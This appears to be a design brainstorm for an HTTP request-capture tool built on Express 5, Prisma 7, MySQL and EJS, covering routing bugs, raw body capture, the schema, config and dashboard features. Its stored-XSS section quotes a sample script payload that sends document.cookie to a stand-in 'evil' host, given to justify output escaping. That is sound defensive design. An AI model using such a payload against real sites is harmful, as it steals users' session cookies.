# Brainstorm — HTTP Listener (Request Tester) MVP

**Date:** 2026-09-10
**Spec:** [spec-driven-document.md](../spec-driven-document.md)
**Status:** Complete — ready for `/plan`

---

## 1. Stack (confirmed)

| Layer | Choice | Notes |
|---|---|---|
| Runtime | Node.js 24.21.0 | Native TS type stripping — **no build step** |
| Language | TypeScript | `tsc --noEmit` for type checking only |
| Framework | Express **5.2.1** | Not v4 — see breaking change below |
| ORM | Prisma **7.10.0** (pinned) | Driver-adapter architecture |
| DB Driver | `@prisma/adapter-mariadb` 7.10.0 | Speaks the MySQL protocol |
| Database | MySQL | |
| Views | EJS | `<%= %>` auto-escaping is a security requirement, not a preference |
| Auth | None | Internal testing tool (spec §2.2) |

`package.json` must change `"type": "commonjs"` → `"module"` (verified: `import` fails otherwise).

---

## 2. Verified Findings

All confirmed by execution in an isolated scratchpad, not from memory.

### 2.1 SPEC BUG — §12.2 route crashes on Express 5

```js
app.all('/listen/*', captureRequest);   // spec §12.2 — Express 4 syntax
```

Express 5 upgraded to `path-to-regexp` v8, which **removed unnamed wildcards**. Verified error:

```
Missing parameter name at index 9: /listen/*
```

This throws at startup — it does not silently 404. Correct syntax:

```ts
app.all('/listen{/*splat}', captureRequest);
```

Verified matching: `/listen` → 200, `/listen/report/1?debug=true` → 200, `/listen/a/b/c/d` → 200.
The braces make the segment optional, collapsing §12.2's two `app.all` lines into one.

> **ACTION:** spec §12.2 needs correcting.

### 2.2 SPEC ISSUE — §12.2 body handling breaks the product

§12.2 implies `express.json()`. Three failures:

| Problem | Consequence |
|---|---|
| Rejects malformed JSON with **400** before the handler runs | Cannot capture broken payloads — *the top reason to use this tool* |
| Parses the body | Destroys the raw fidelity required by §4 and §11.2 |
| Defaults to **100kb** | Violates §15.3 |

**Decision:** `express.raw({ type: '*/*', limit: MAX_BODY_SIZE })`.
Verified: malformed body `{"name":"Monthly Report` captured **verbatim**, HTTP 200.

Verified gotcha: on a bodyless GET, `req.body` is `{}` — **not** an empty Buffer.

```ts
const body = Buffer.isBuffer(req.body) ? req.body.toString('utf8') : '';
```

### 2.3 Prisma 7 requires driver adapters

`datasourceUrl` no longer exists. Verified from `PrismaClientOptions`:

> "A driver adapter (or, alternatively, a Prisma Accelerate URL) is **required**."

`PrismaMariaDb` accepts `mariadb.Pool | mariadb.PoolConfig | string`. `PoolConfig` exposes
separate `host` / `port` / `user` / `password` / `database` / `connectionLimit` fields —
so **separated env entries are the native Prisma 7 approach**, not a workaround.

### 2.4 Version trap — `npm i prisma` installs a release candidate

| Package | `latest` dist-tag |
|---|---|
| `prisma` (CLI) | **8.0.0-rc.13** — release candidate |
| `@prisma/client` | **7.10.0** — stable |

A plain install yields a **mismatched CLI/client pair**. Prisma requires identical versions.

**Decision:** pin exact, no caret — `"prisma": "7.10.0"`, `"@prisma/client": "7.10.0"`,
`"@prisma/adapter-mariadb": "7.10.0"`.

### 2.5 Accepted risk — `mariadb` driver advisories

`npm audit`: 3 advisories (1 high), **no fix available**.

| Advisory | Reachable here? |
|---|---|
| Cleartext password to MitM despite `ssl: true` | No — localhost has no network path |
| Cleartext transmission of credentials | No — same |
| SQLi via Buffer escaping under `big5/gbk/sjis/cp932/gb18030` | No — we use `utf8mb4` |

It is the only Prisma adapter for local MySQL. **Accepted for localhost.**
Escape hatches if this ever leaves localhost: PostgreSQL + `@prisma/adapter-pg` (clean audit),
or drop Prisma for `mysql2`.

### 2.6 Stored XSS in the dashboard

Not in the spec, but it follows directly from Listen → Show: the dashboard renders headers,
URLs and bodies supplied by **external systems**. A header value of
`<script>fetch('http://evil/'+document.cookie)</script>` executes on the detail page.

**Mitigation:** EJS `<%= %>` (auto-escaping) everywhere. **Never `<%- %>`** on captured data.
This is why hand-rolled template literals were rejected as the view layer.

---

## 3. Architecture

```
External system                            Browser
      | ANY /listen/**                          | GET /requests
      v                                         v
express.raw({type:'*/*'})              urlencoded + methodOverride
  captures bytes, parses nothing         (dashboard routes ONLY)
      v                                         v
listenController.capture               requestsController.index/show
  method, url, query                     prisma.findMany (body EXCLUDED)
  headers -> normalize to arrays         orderBy id desc, skip/take
  body -> Buffer? utf8/base64 : ''            v
      v                                  EJS <%= %> auto-escape
  prisma.requestLog.create()                  v
      |-- ok    -> 200 {status:"OK"}     HTML (XSS-safe)
      +-- throw -> 500 {status:"ERROR"}
```

**Critical:** `express.raw` mounts **only** on `/listen`; `express.urlencoded` mounts **only**
on `/requests`. Either one mounted globally consumes the stream and breaks raw capture.

---

## 4. Schema

```prisma
model RequestLog {
  id           Int      @id @default(autoincrement())
  method       String   @db.VarChar(16)
  url          String   @db.Text
  headers      Json
  query        Json
  body         String?  @db.LongText
  bodyEncoding String   @default("utf8") @map("body_encoding") @db.VarChar(8)
  bodySize     Int      @default(0)      @map("body_size")
  createdAt    DateTime @default(now())  @map("created_at")

  @@map("requests")
}
```

| Choice | Reason |
|---|---|
| `Int`, not `BigInt` (spec §5 suggests BIGINT) | `JSON.stringify` **throws** on JS `BigInt`. 4.2B rows is far beyond a dev tool's needs. |
| `@db.LongText` | MySQL `TEXT` caps at 64KB — a 50mb body would truncate. |
| No `updated_at` | Append-only; §5 makes it optional. |
| `orderBy: { id: 'desc' }` | Two requests in the same millisecond have **no deterministic order** by `created_at`. Autoincrement id is exact insertion order. |
| `bodyEncoding` | Enhancement #1 — binary-safe bodies. |
| `bodySize` | Raw byte count. Lets the UI say "4.2 MB" **without loading the body**. |

**The list query MUST NOT select `body`.** Paginating 20 rows would otherwise pull
20 × up-to-50MB into memory. Use an explicit `select` that omits it — this is why `bodySize`
exists as a separate column.

---

## 5. Configuration (separated entries)

```env
# ═══ DATABASE ═══
DATABASE_ENGINE=mysql          # validated at startup; only "mysql" supported in MVP
DATABASE_HOST=127.0.0.1
DATABASE_PORT=3306
DATABASE_USER=root
DATABASE_PASSWORD=
DATABASE_NAME=request_tester

# ═══ APP ═══
PORT=3000
PAGE_SIZE=20                   # spec §7
MAX_BODY_SIZE=50mb             # documented deviation from §15.3 — see below
BODY_PREVIEW_CHARS=2000        # chars shown before the fold
BODY_INLINE_MAX=131072         # 128KB — above this, body is not sent to the browser at all
```

Wired through a single `src/config.ts` that reads these into a `mariadb.PoolConfig`:

```ts
new PrismaMariaDb({
  host: env.DATABASE_HOST,
  port: Number(env.DATABASE_PORT),
  user: env.DATABASE_USER,
  password: env.DATABASE_PASSWORD,
  database: env.DATABASE_NAME,
})
```

No URL string, and no `encodeURIComponent` escaping of passwords containing `@` or `#`.
`prisma.config.ts` supplies the same adapter to the migrate CLI, so the app and the CLI share
one source of truth.

> **Verify during `/plan`:** the exact `datasource db { }` block shape in `schema.prisma` under
> Prisma 7 + adapters (whether `url` may be omitted entirely). Do not assume.

**Documented deviation:** §15.3 says no app-level body limit, but `express.raw` defaults to
100kb — silence is not an option, the value must be set explicitly. `MAX_BODY_SIZE=50mb` is
deliberate. A truly unlimited body means unbounded memory per request.

---

## 6. Routes (spec §10)

| Method | Path | Handler |
|---|---|---|
| `ANY` | `/listen{/*splat}` | `listenController.capture` |
| `GET` | `/requests` | `requestsController.index` |
| `GET` | `/requests/:id` | `requestsController.show` |
| `GET` | `/requests/:id/body` | `requestsController.rawBody` *(new — see §8)* |
| `DELETE` | `/requests/:id` | `requestsController.destroy` |
| `DELETE` | `/requests` | `requestsController.destroyAll` |
| `GET` | `/` | redirect → `/requests` |

**HTML forms only support GET and POST**, so Delete buttons cannot call the DELETE routes
directly. The solution is the one Laravel uses for `@method('DELETE')`: the `method-override`
middleware reading a hidden `_method` field. The spec's DELETE verbs stay intact for curl/API use.

---

## 7. Components

| File | Responsibility |
|---|---|
| `src/server.ts` | App wiring, middleware mounting, EJS setup, `listen()` |
| `src/config.ts` | Read + validate env, build `PoolConfig` |
| `src/db.ts` | `PrismaClient` singleton with the `PrismaMariaDb` adapter |
| `src/routes/listen.ts` | Catch-all route + `express.raw` |
| `src/routes/requests.ts` | Dashboard routes + `urlencoded` + `methodOverride` |
| `src/controllers/listenController.ts` | Capture → normalize → persist → 200/500 |
| `src/controllers/requestsController.ts` | index / show / rawBody / destroy / destroyAll |
| `src/lib/headers.ts` | Node flat headers → Laravel array shape |
| `src/lib/body.ts` | UTF-8 validity check, encoding decision, size formatting |
| `src/lib/curl.ts` | Enhancement #2 — cURL reconstruction |
| `src/views/layout.ejs`, `index.ejs`, `show.ejs` | Spec §14.1, §14.2 |
| `prisma/schema.prisma`, `prisma.config.ts` | Schema + migrations |

### Header normalization (spec §4.1 parity with Laravel `HeaderBag::all()`)

```ts
const headers: Record<string, string[]> = {};
for (const [k, v] of Object.entries(req.headers)) {
  if (v !== undefined) headers[k] = Array.isArray(v) ? v : [v];
}
```

Verified necessary: Node returns flat strings (`"content-type": "application/json"`),
while spec §4.1 shows arrays (`"content-type": ["application/json"]`).

---

## 8. Accepted Enhancements

### #1 — Binary-safe bodies

`.toString('utf8')` mangles binary payloads (PNG, gzip) into replacement characters,
unrecoverably. Detection on capture:

```ts
const isUtf8 = Buffer.compare(Buffer.from(buf.toString('utf8'), 'utf8'), buf) === 0;
// isUtf8 -> store as-is, bodyEncoding = 'utf8'
// else   -> store base64, bodyEncoding = 'base64'
```

The detail view shows a notice and a download link for binary bodies instead of garbled text.

### #2 — Copy as cURL

Reconstructs a runnable `curl` command from method, URL, headers and body.
Must shell-escape single quotes in header values and body. Rendered in a `<pre>` with a
minimal clipboard button.

### #5 — Pretty-print JSON bodies

Only when the content-type is JSON **and** `bodySize <= BODY_INLINE_MAX`.
`JSON.parse` **must** be wrapped in try/catch — malformed bodies are a first-class use case
here, not an edge case. On parse failure, fall back to raw display.

### #8 (new) — Body truncation with "Show more"

Three-tier, no JavaScript required (`<details>` is native HTML):

| Body size | Rendering |
|---|---|
| `<= BODY_PREVIEW_CHARS` (2000) | Rendered plain, no toggle |
| `<= BODY_INLINE_MAX` (128KB) | Preview + `<details><summary>Show more</summary>` holding the rest |
| `> BODY_INLINE_MAX` | Preview + `Body is 4.2 MB — [View raw]` → `GET /requests/:id/body` |

The raw endpoint streams `text/plain` with **`X-Content-Type-Options: nosniff`** so the browser
cannot sniff attacker-supplied bytes into executable HTML.

Long URLs in the list view are truncated with an ellipsis plus a `title` attribute.

**Declined:** #3 Docker Compose, #4 auto-refresh, #6 filtering, #7 retention cap.
(#7 remains a real unbounded-growth risk, deliberately deferred per §15.2.)

---

## 9. Affected Use Cases

`docs/use-cases.md` does not exist — this is greenfield.

```
AFFECTED USE CASES (consolidated):
- NEW:      capture http request, view request list, view request detail,
            view raw request body, paginate request list,
            delete single request, delete all requests
- MODIFIED: (none)
- REMOVED:  (none)
```

---

## 10. Open Items for `/plan`

1. Verify the exact `datasource db { }` block shape under Prisma 7 + driver adapters.
2. Correct spec §12.2 — Express 5 route syntax, and `express.json()` → `express.raw()`.
3. Add `body_encoding` / `body_size` to spec §5.
4. Node lives at `C:\Program Files\nodejs\` but is **not on PATH** — fix the shell profile
   before relying on npm scripts.
